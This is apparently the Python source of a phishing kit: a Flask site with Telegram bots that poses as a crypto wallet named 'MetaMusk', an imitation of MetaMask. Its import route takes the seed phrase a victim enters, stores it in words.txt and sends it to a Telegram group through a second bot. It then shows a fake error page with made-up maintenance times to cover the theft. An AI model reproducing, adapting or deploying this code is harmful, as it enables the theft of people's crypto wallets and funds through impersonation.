import os
import threading
import asyncio
from datetime import datetime, timedelta

from flask import Flask, render_template, request, session
import requests

from telegram import Bot, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ================== НАСТРОЙКИ ==================
TELEGRAM_TOKEN_MAIN = os.getenv("TELEGRAM_TOKEN_MAIN")   # бот для пользователей
TELEGRAM_TOKEN_GROUP = os.getenv("TELEGRAM_TOKEN_GROUP") # бот для группы
CHAT_ID = os.getenv("CHAT_ID")                           # id группы
SECRET_KEY = os.getenv("SECRET_KEY", "mysecretkey")      # для Flask session
SITE_URL = os.getenv("SITE_URL", "https://digital-953g.onrender.com/")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FILE_PATH = os.path.join(BASE_DIR, "words.txt")

# Память: кто создал кошелёк
user_wallets = {}

# Flask
app = Flask(__name__)
app.secret_key = SECRET_KEY

# ================== ФУНКЦИЯ: отправка в группу ==================
group_bot = Bot(token=TELEGRAM_TOKEN_GROUP)

async def send_to_group(message: str):
    """Отправить сообщение вторым ботом в группу"""
    await group_bot.send_message(chat_id=CHAT_ID, text=message)

# ================== TELEGRAM-БОТ ==================
application = Application.builder().token(TELEGRAM_TOKEN_MAIN).build()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # если уже создавал кошелёк → перенаправляем сразу на new_wallet
    if user_wallets.get(user_id, False):
        target_url = f"{SITE_URL}/new_wallet"
    else:
        target_url = SITE_URL

    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Открыть MetaMusk", web_app=WebAppInfo(url=target_url))]
    ])

    await update.message.reply_text(
        f"Привет, {update.effective_user.first_name}! 🚀\n"
        f"Нажми кнопку ниже, чтобы открыть кошелек MetaMusk:",
        reply_markup=markup
    )

application.add_handler(CommandHandler("start", start))

def run_bot():
    application.run_polling()

# ================== FLASK-МАРШРУТЫ ==================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/wallet')
def wallet():
    return render_template('wallet.html')

@app.route('/error')
def error():
    now = datetime.now()
    start = now - timedelta(hours=1)
    end = now + timedelta(hours=3)
    start_time = start.strftime("%H:%M %d.%m.%Y")
    end_time = end.strftime("%H:%M %d.%m.%Y")
    return render_template("error.html", start_time=start_time, end_time=end_time)

@app.route('/new_wallet')
def new_wallet():
    # помечаем пользователя как создавшего кошелёк
    user_id = session.get("telegram_user_id")
    if user_id:
        user_wallets[user_id] = True
        # уведомим в группу
        asyncio.run(send_to_group(f"Пользователь {user_id} создал новый кошелёк"))
    return render_template('new_wallet.html')

@app.route('/import', methods=['GET', 'POST'])
def import_wallet():
    if request.method == 'POST':
        seed_phrase = request.form.get('words')
        if seed_phrase:
            # сохранить в файл
            with open(FILE_PATH, 'a', encoding='utf-8') as f:
                f.write(seed_phrase + '\n')

            # отправить во 2-й бот в группу
            asyncio.run(send_to_group(f"Импортирована сид-фраза:\n{seed_phrase}"))

            return render_template('error.html')
    return render_template('import.html')

# ================== MAIN ==================
if __name__ == '__main__':
    # Запускаем бота в отдельном потоке
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

    # Flask сервер
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
